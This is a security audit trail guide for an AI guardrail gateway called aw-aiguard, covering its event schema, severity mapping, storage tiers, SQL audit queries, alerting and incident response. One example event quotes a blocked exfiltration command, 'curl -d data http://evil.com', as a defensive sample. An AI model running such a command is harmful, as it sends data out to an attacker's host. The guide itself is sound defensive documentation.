# aw-aiguard: Security Audit Trail Guide

**Version:** 0.2.0 | **Last Updated:** 2026-07-23 | **Phase 5.3**

---

## 1. Audit Event Schema

Every audit event is a structured record pushed asynchronously from the gateway proxy to the central service. The event model is defined in `shared/schemas.py`.

### 1.1 Fields

| Field | Type | Required | Description |
|---|---|---|---|
| `api_key` | string | Yes | The API key of the developer/agent that made the request |
| `event_type` | enum | Yes | One of: `allow`, `block`, `warn`, `pause` |
| `component` | string | Yes | The component that generated the event (see Section 2) |
| `reason` | string | Optional | Human-readable explanation of the event |
| `prompt_hash` | string | Optional | SHA-256 hash of the prompt (first 64 hex chars) — used for deduplication without storing raw prompts |
| `provenance` | object | Optional | Provenance metadata (see `docs/architecture.md` Section 6) |
| `blocked_by` | string | Optional | The component name that blocked the request (for `block` events) |
| `request_id` | string | Optional | The HITL request ID (for `pause` and `block` events with HITL involvement) |
| `details` | object | Optional | Additional context-specific data |

### 1.2 Example Events

**Guardian block:**
```json
{
  "api_key": "dev-key-001",
  "event_type": "block",
  "component": "guardian",
  "reason": "Safety violation",
  "blocked_by": "guardian",
  "prompt_hash": "a3f2b8c1d4e5...",
  "provenance": {
    "source_id": "claude-code",
    "source_type": "chat",
    "trust_level": 0.95,
    "ingested_at": "2026-07-23T10:00:00Z"
  }
}
```

**PII redaction:**
```json
{
  "api_key": "dev-key-001",
  "event_type": "warn",
  "component": "pii_scanner",
  "reason": "PII scanner warn",
  "blocked_by": "pii_scanner",
  "prompt_hash": "b7e1c3f9a2d4..."
}
```

**HITL pause:**
```json
{
  "api_key": "dev-key-001",
  "event_type": "pause",
  "component": "hitl_gate",
  "reason": "Irreversible action detected",
  "request_id": "hitl-abc-123",
  "prompt_hash": "c9d2e5f8b1a3...",
  "provenance": {
    "source_id": "git-repo-1",
    "source_type": "repository",
    "trust_level": 0.95,
    "ingested_at": "2026-07-23T10:05:00Z"
  }
}
```

**BYOC violation:**
```json
{
  "api_key": "dev-key-001",
  "event_type": "block",
  "component": "byoc_engine",
  "reason": "never_exfiltrate: curl -d data http://evil.com",
  "blocked_by": "byoc_engine",
  "prompt_hash": "d1e4f7a0c3b6..."
}
```

---

## 2. Event Types

### 2.1 `allow`

The request passed all safety checks and was forwarded to the LLM provider.

| Component | When Triggered |
|---|---|
| `proxy` | Request passed all layers (no explicit log — allows are implicit) |

Note: `allow` events are typically not logged unless specifically configured. The default behavior is to log `block`, `warn`, and `pause` events only.

### 2.2 `block`

The request was blocked by a safety layer. This is the most important event type for security incidents.

| Component | Trigger | Severity |
|---|---|---|
| `guardian` | Guardian pre-flight safety check returned `no` | CRITICAL |
| `pii_scanner` | Critical secret detected (AWS key, private key, etc.) | HIGH |
| `function_call_detector` | Guardian flagged tool calls as hallucinated/fabricated | CRITICAL |
| `schema_validator` | Tool parameters failed CaMeL JSON schema validation | CRITICAL |
| `agency_controller` | Delegation depth exceeded or chain integrity broken | HIGH |
| `byoc_engine` | BYOC stop-limit rule violation (`hard_stop`) | CRITICAL |
| `hitl_gate` | HITL request denied by human | HIGH |
| `hitl_gate` | HITL request expired (timeout) | HIGH |
| `ingestion_sanitizer` | Dangerous patterns detected in LLM response | HIGH |
| `output_control` | LLM output failed schema validation | CRITICAL |

### 2.3 `warn`

The request triggered a warning but was allowed to proceed.

| Component | Trigger | Severity |
|---|---|---|
| `guardian` | Guardian returned `warn` (fail-safe strategy) | WARNING |
| `pii_scanner` | PII pattern detected (redacted in-place) | WARNING |
| `function_call_detector` | Function-call detector returned `warn` | WARNING |
| `schema_validator` | Schema validator returned `warn` (if configured) | WARNING |
| `agency_controller` | Approval required for tool at current depth | WARNING |
| `byoc_engine` | BYOC rule returned `warn` (soft_block) | WARNING |
| `ingestion_sanitizer` | Dangerous patterns found in response (sanitized) | WARNING |
| `output_control` | Output control returned `warn` | WARNING |
| `thinking_mode_verifier` | Thinking-mode Guardian returned `no` (advisory) | WARNING |

### 2.4 `pause`

The request was paused for human approval (HITL).

| Component | Trigger | Severity |
|---|---|---|
| `hitl_gate` | Irreversible action detected, awaiting human approval | NOTICE |

---

## 3. Severity Levels

The central service maps each `event_type` + `component` combination to a severity level. This drives alert dispatch and visual indicators in the Admin Dashboard.

### 3.1 Severity Mapping

```python
def _get_severity(event: AuditEvent) -> str:
    if event.event_type == "block":
        if event.component == "guardian":
            return "CRITICAL"
        if event.component == "byoc_engine":
            return "CRITICAL"
        if event.component == "function_call_detector":
            return "CRITICAL"
        if event.component == "schema_validator":
            return "CRITICAL"
        if event.component == "output_control":
            return "CRITICAL"
        if event.component == "pii_scanner":
            return "HIGH"
        if event.component == "ingestion_sanitizer":
            return "HIGH"
        if event.component == "agency_controller":
            return "HIGH"
        return "HIGH"  # hitl_gate blocks, etc.
    if event.event_type == "warn":
        if event.component == "thinking_mode_verifier":
            return "WARNING"
        if event.component == "output_control":
            return "WARNING"
        if event.component == "function_call_detector":
            return "WARNING"
        if event.component == "ingestion_sanitizer":
            return "WARNING"
        if event.component == "schema_validator":
            return "WARNING"
        if event.component == "agency_controller":
            return "WARNING"
        return "WARNING"  # guardian, pii_scanner, byoc_engine, etc.
    if event.event_type == "pause":
        return "NOTICE"
    return "NOTICE"
```

### 3.2 Severity-to-Emoji Mapping

The alert engine maps severity levels to emoji indicators for visual recognition:

| Severity | Emoji | Description |
|---|---|---|
| `CRITICAL` | 🔴 | Immediate action required — safety violation detected |
| `HIGH` | 🟠 | Investigation needed — security event detected |
| `WARNING` | 🟡 | Review recommended — suspicious activity detected |
| `NOTICE` | ⚪ | Informational — routine security event |

### 3.3 Unknown Severity

Events with an unrecognized `event_type` + `component` combination are silently dropped (no alert is sent). This prevents alert noise from unknown or future components.

---

## 4. Audit Storage

### 4.1 Hot Tier (PostgreSQL)

| Property | Value |
|---|---|
| **Technology** | PostgreSQL 16 |
| **Storage** | Native SQL tables |
| **Access Speed** | Sub-second (native SQL queries) |
| **TTL** | 30 days (configurable via `AUDIT_TTL_DAYS`) |
| **Partitioning** | Monthly partitions on `audit_logs.created_at` |
| **Retention** | Automatic archive → drop → create cycle every 6 hours |

**Tables:**
- `audit_logs` — Main audit event store (partitioned)
- `provenance` — Data lineage records
- `settings_history` — Settings change history
- `hitl_approvals` — HITL approval state
- `byoc_rules` — Cloud-stored BYOC rules
- `settings_audit_log` — Settings change audit trail
- `gateway_status` — Gateway heartbeat and liveness

**Indexes:**
1. `idx_audit_logs_created_at` — Monthly partition key
2. `idx_audit_logs_event_type` — Filter by event type
3. `idx_audit_logs_component` — Filter by component
4. `idx_audit_logs_api_key` — Filter by developer
5. `idx_audit_logs_prompt_hash` — Deduplication lookups

### 4.2 Cold Tier (MinIO)

| Property | Value |
|---|---|
| **Technology** | MinIO (S3-compatible object storage) |
| **Format** | JSONL.gz (compressed JSON lines) |
| **Access Speed** | Minutes (async export) |
| **Retention** | Indefinite |
| **Trigger** | Scheduled every 6 hours or manual via `POST /admin/partition-manage` |

**Archive process:**
1. `archive_partition()` — Selects partitions older than `AUDIT_TTL_DAYS`, exports to JSONL.gz in MinIO
2. `drop_partition()` — Drops the archived partition from PostgreSQL
3. `create_future_partitions()` — Creates N+1 through N+3 future monthly partitions (idempotent)

### 4.3 Local Fallback (JSONL Buffer)

When the central service is unreachable, the gateway proxy writes audit events to a local JSONL buffer:

```python
# gateway/core/audit.py
# Buffer: List[AuditEvent] — in-memory buffer when backend offline
# Replay: On reconnection, buffer events are sent via POST /audit/batch
```

The buffer replays automatically when the backend becomes available again. This ensures no audit events are lost during outages.

---

## 5. Audit Queries

### 5.1 Recent Security Events

```sql
-- Last 50 security events (blocks and warnings)
SELECT * FROM audit_logs
WHERE event_type IN ('block', 'warn')
ORDER BY created_at DESC
LIMIT 50;
```

### 5.2 Events by Developer

```sql
-- All events for a specific developer
SELECT * FROM audit_logs
WHERE api_key = 'dev-key-001'
ORDER BY created_at DESC
LIMIT 100;
```

### 5.3 Events by Component

```sql
-- All Guardian blocks
SELECT * FROM audit_logs
WHERE component = 'guardian' AND event_type = 'block'
ORDER BY created_at DESC;

-- All HITL pauses
SELECT * FROM audit_logs
WHERE component = 'hitl_gate' AND event_type = 'pause'
ORDER BY created_at DESC;

-- All BYOC violations
SELECT * FROM audit_logs
WHERE component = 'byoc_engine'
ORDER BY created_at DESC;
```

### 5.4 Events by Time Range

```sql
-- Events from the last 24 hours
SELECT * FROM audit_logs
WHERE created_at >= NOW() - INTERVAL '24 hours'
ORDER BY created_at DESC;

-- Events from a specific date
SELECT * FROM audit_logs
WHERE DATE(created_at) = '2026-07-23'
ORDER BY created_at DESC;
```

### 5.5 Provenance Tracking

```sql
-- Provenance records for a specific source
SELECT * FROM provenance
WHERE source_id = 'git-repo-1'
ORDER BY ingested_at DESC;

-- Low-trust provenance records
SELECT * FROM provenance
WHERE trust_level < 0.5
ORDER BY ingested_at DESC;
```

### 5.6 HITL Audit

```sql
-- Pending HITL requests
SELECT * FROM hitl_approvals
WHERE status = 'pending'
ORDER BY timeout_at ASC;

-- Approved HITL requests
SELECT * FROM hitl_approvals
WHERE status = 'approved'
ORDER BY approved_at DESC;

-- Denied/Expired HITL requests
SELECT * FROM hitl_approvals
WHERE status IN ('denied', 'expired')
ORDER BY updated_at DESC;
```

### 5.7 BYOC Rule History

```sql
-- Active BYOC rules
SELECT * FROM byoc_rules
WHERE is_active = true
ORDER BY name;

-- BYOC rule version history
SELECT * FROM byoc_rules
WHERE name = 'never_exfiltrate'
ORDER BY version DESC
LIMIT 10;
```

### 5.8 Settings Change Audit

```sql
-- Settings changes for a developer
SELECT * FROM settings_audit_log
WHERE developer_id = 'dev-001'
ORDER BY changed_at DESC
LIMIT 50;

-- All settings changes
SELECT * FROM settings_audit_log
ORDER BY changed_at DESC
LIMIT 100;
```

### 5.9 Gateway Liveness

```sql
-- Online gateways
SELECT * FROM gateway_status
WHERE is_online = true
ORDER BY last_heartbeat DESC;

-- Gateways that haven't checked in (potentially offline)
SELECT * FROM gateway_status
WHERE last_heartbeat < NOW() - INTERVAL '5 minutes';
```

### 5.10 Security Incidents — Common Patterns

```sql
-- Repeated Guardian blocks from the same developer
SELECT api_key, COUNT(*) as block_count
FROM audit_logs
WHERE component = 'guardian' AND event_type = 'block'
GROUP BY api_key
HAVING COUNT(*) > 5
ORDER BY block_count DESC;

-- Repeated BYOC violations
SELECT api_key, component, COUNT(*) as violation_count
FROM audit_logs
WHERE component = 'byoc_engine' AND event_type = 'block'
GROUP BY api_key, component
ORDER BY violation_count DESC;

-- HITL requests denied
SELECT request_id, api_key, reason
FROM audit_logs
WHERE component = 'hitl_gate' AND event_type = 'block' AND reason LIKE '%denied%'
ORDER BY created_at DESC;
```

---

## 6. Alert Configuration

### 6.1 Alert Channels

Alerts are dispatched through the `AlertEngine` (`central-service/alert_engine.py`) to configured channels:

| Channel | Implementation | Configuration |
|---|---|---|
| Telegram | Bot API (`sendMessage`) | `TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID` |
| Slack | Incoming Webhook | `SLACK_WEBHOOK_URL` |
| Email | SMTP (`smtplib`) | `SMTP_HOST`, `SMTP_PORT`, `SMTP_USER`, `SMTP_PASSWORD` |

### 6.2 Channel Selection

Alert channels are configured in `guardrail-config/settings.yaml`:

```yaml
alert_channels: ["telegram", "slack", "email"]
```

If no channels are configured, alerts are logged but not dispatched. Empty channels cause no crash.

### 6.3 Alert Severity Filtering

Only events with severity `CRITICAL`, `HIGH`, or `WARNING` trigger alerts. `NOTICE` events are logged but not alerted.

```python
if severity in ("CRITICAL", "HIGH", "WARNING"):
    message = f"{event.component}: {event.reason or event.event_type} (key={event.api_key})"
    await alert_engine.send(severity, message, event)
```

### 6.4 Alert Payload

Each alert includes:
- Severity level with emoji indicator
- Component name (e.g., `guardian`, `pii_scanner`, `hitl_gate`)
- Reason for the event
- API key of the developer/agent
- Event type (`block`, `warn`, `pause`)

### 6.5 ESCALATE Alerts

When the same provenance source generates repeated `no` scores (potential poisoning), the system triggers an ESCALATE alert:
- Flags the data source as potentially poisoned
- Rate-limits queries to that source
- Sends multi-channel notification

### 6.6 Credential Warnings

If alert channel credentials are missing or empty, the alert engine logs a warning but does not crash. This allows the system to run without alerting configured (useful for local development).

---

## 7. Retention Policy

### 7.1 Hot Tier

| Property | Value |
|---|---|
| **Storage** | PostgreSQL |
| **Retention** | 30 days (configurable via `AUDIT_TTL_DAYS` or `guardrail-config/settings.yaml` → `audit_ttl_days`) |
| **Partitioning** | Monthly native SQL partitions |
| **Query Speed** | Sub-second (native SQL) |

### 7.2 Cold Tier

| Property | Value |
|---|---|
| **Storage** | MinIO (S3-compatible) |
| **Format** | JSONL.gz (compressed JSON lines) |
| **Retention** | Indefinite |
| **Export Method** | Scheduled every 6 hours or manual trigger |
| **Query Speed** | Minutes (async export for bulk analysis) |

### 7.3 Partition Lifecycle

The `PartitionManager` (`central-service/partition_manager.py`) manages the hot→cold data lifecycle:

```
1. Archive: partition older than TTL → JSONL.gz → MinIO
2. Drop: remove archived partition from PostgreSQL
3. Create: create N+1 through N+3 future monthly partitions
```

**Functions (in `migrations/002_partition_lifecycle.sql`):**
- `drop_archived_partition()` — Drop partitions that have been archived
- `create_monthly_partition()` — Create a new monthly partition (idempotent)
- `list_archivable_partitions()` — List partitions eligible for archival

### 7.4 Compliance Considerations

- **Audit logs are immutable** once written to the database
- **Provenance records** are stored separately for data lineage tracking
- **Settings changes** are logged with `old_value` and `sync_source` for forensics
- **HITL approvals** carry the full prompt context for audit trails
- **BYOC rules** maintain version history for rule change auditing

---

## 8. Incident Response

### 8.1 Step-by-Step Guide

When a security event is detected (alert received or audit log inspection reveals an issue), follow these steps:

#### Step 1: Assess Severity

Check the alert severity:
- **🔴 CRITICAL** — Immediate investigation required
- **🟠 HIGH** — Investigation within hours
- **🟡 WARNING** — Review during business hours
- **⚪ NOTICE** — Informational, no action required

#### Step 2: Identify the Source

Use the audit log to trace the event:
```sql
SELECT * FROM audit_logs
WHERE component = '<component>' AND event_type = 'block'
ORDER BY created_at DESC
LIMIT 10;
```

Key fields to examine:
- `api_key` — Which developer/agent triggered the event
- `prompt_hash` — SHA-256 hash of the prompt (for deduplication)
- `provenance` — Data origin and trust level
- `reason` — Why the event was triggered
- `blocked_by` — Which component blocked the request

#### Step 3: Determine Impact

| Scenario | Impact | Action |
|---|---|---|
| Guardian block | Request was blocked before reaching LLM | No impact — check if legitimate request was false-positive |
| PII block | Sensitive data was detected and request blocked | No data exfiltrated — check if sensitive data should be allowed |
| HITL pause | Action paused for human approval | No action taken — review and approve/deny in Dashboard |
| HITL deny | Human denied the action | No action taken — this is expected behavior |
| BYOC block | Stop-limit rule violated | No action taken — review BYOC rules for false positives |
| Function-call hallucination | Fabricated tool call blocked | No unauthorized tool execution — review model behavior |

#### Step 4: Review the Prompt

While raw prompts are not stored (only `prompt_hash`), the `reason` field and `details` field provide context. For deeper investigation:
1. Check the Admin Dashboard → Audit Browser
2. Filter by `api_key`, `component`, and `event_type`
3. Review the `reason` and `provenance` fields

#### Step 5: Respond

**For false positives:**
- Adjust the relevant configuration (`scan_rules.yaml`, `byoc_rules.yaml`, etc.)
- Add patterns to the ignore/allowlist
- Adjust Guardian threshold (`guardian_threshold: 0.85`)
- Update `llm_safety_mode` from `hard_block` to `warn_only` for testing

**For genuine security events:**
- Investigate the data source that triggered the event
- Check provenance: is the source trustworthy?
- Review the agent's tool access — should it have write permissions?
- Consider tightening BYOC rules or adding new stop-limit patterns

**For repeated events from the same source:**
```sql
-- Check for repeated violations
SELECT api_key, component, COUNT(*) as count
FROM audit_logs
WHERE event_type = 'block'
GROUP BY api_key, component
HAVING COUNT(*) > 5;
```

#### Step 6: Document

All incidents should be documented:
1. Create an entry in the audit browser (Dashboard → Audit Browser)
2. Note the root cause and resolution
3. If configuration was changed, record in settings audit trail
4. Update BYOC rules if a new threat pattern was discovered

### 8.2 Emergency Procedures

**If Guardian service is down:**
```bash
# Check Guardian connectivity
curl http://localhost:8000/guardian

# If unreachable, change fail strategy to allow (temporary)
# Edit .env: GUARDIAN_FAIL_STRATEGY=allow
# Restart proxy
```

**If central service is unreachable:**
```bash
# Audit events will buffer locally (JSONL fallback)
# Check buffer status in proxy logs
tail -f gateway/proxy.log

# Restart central service
cd central-service && docker compose restart
# Buffer will replay automatically on reconnection
```

**If a critical security event is detected in production:**
1. Immediately check the Admin Dashboard → Approval Queue for pending HITL requests
2. Deny any suspicious HITL requests
3. Review the Audit Browser for recent blocks
4. Consider temporarily increasing Guardian threshold or adding BYOC rules
5. Notify the security team via the alert channel

---

## Quick Reference: Event Component → Severity

| Component | Block Severity | Warn Severity |
|---|---|---|
| `guardian` | CRITICAL | WARNING |
| `pii_scanner` | HIGH | WARNING |
| `function_call_detector` | CRITICAL | WARNING |
| `schema_validator` | CRITICAL | WARNING |
| `agency_controller` | HIGH | WARNING |
| `byoc_engine` | CRITICAL | WARNING |
| `hitl_gate` | HIGH | — |
| `ingestion_sanitizer` | HIGH | WARNING |
| `output_control` | CRITICAL | WARNING |
| `thinking_mode_verifier` | CRITICAL | WARNING |

---

## References

- **Architecture documentation:** `docs/architecture.md` (Section 4: Data Flow, Section 6: Provenance System)
- **Configuration reference:** `guardrail-config/README.md`
- **Alert engine implementation:** `central-service/alert_engine.py`
- **Audit DB schema:** `central-service/audit_db.py`
- **Partition lifecycle:** `central-service/partition_manager.py`
- **Setup guide:** `docs/setup_guide.md`
- **Developer guide:** `docs/developer_guide.md`
